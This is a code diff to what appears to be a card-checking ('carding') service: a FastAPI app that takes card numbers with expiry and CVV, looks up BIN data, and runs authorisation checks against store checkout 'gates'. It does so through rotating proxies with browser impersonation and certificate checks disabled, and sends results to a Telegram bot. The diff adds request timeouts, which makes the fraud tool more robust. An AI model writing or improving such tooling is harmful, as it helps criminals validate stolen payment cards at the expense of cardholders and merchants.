@@ -23,7 +23,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.rotating.checker")
 
-app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.1.0")
+app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.2.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "astra_store": {
@@ -177,7 +177,7 @@ async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = 
     bin_code = card_number[:6]
     default_meta = {"bank": "Unknown Bank", "country": "US", "scheme": "CARD", "type": "CREDIT"}
     try:
-        async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False) as session:
+        async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False, timeout=10) as session:
             resp = await session.get(
                 f"https://lookup.binlist.net/{bin_code}",
                 headers={"Accept-Version": "3"},
@@ -462,6 +462,7 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
             proxies=proxies_dict,
             headers=browser_headers,
             verify=False,
+            timeout=20,
         ) as session:
             if chosen_key == "astra_store":
                 status, reason, code = await execute_astra_auth(session, cc, mm, yy, cvv)
@@ -499,7 +500,7 @@ async def test_proxy(proxy: str) -> dict[str, Any]:
     start = time.perf_counter()
     proxies_dict = parse_proxy_string(proxy)
     try:
-        async with AsyncSession(impersonate="chrome120", proxies=proxies_dict, verify=False) as session:
+        async with AsyncSession(impersonate="chrome120", proxies=proxies_dict, verify=False, timeout=10) as session:
             resp = await session.get("https://api.ipify.org?format=json", timeout=6)
             latency = (time.perf_counter() - start) * 1000
             if resp.status_code == 200:
@@ -524,7 +525,7 @@ async def check_card_endpoint(
 async def send_telegram_alert(token: str = Query(...), chat_id: str = Query(...), message: str = Query(...)) -> dict[str, Any]:
     tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
     try:
-        async with AsyncSession(verify=False) as session:
+        async with AsyncSession(verify=False, timeout=10) as session:
             resp = await session.post(tg_url, data={"chat_id": chat_id, "text": message}, timeout=10)
             if resp.status_code == 200:
                 return {"success": True}
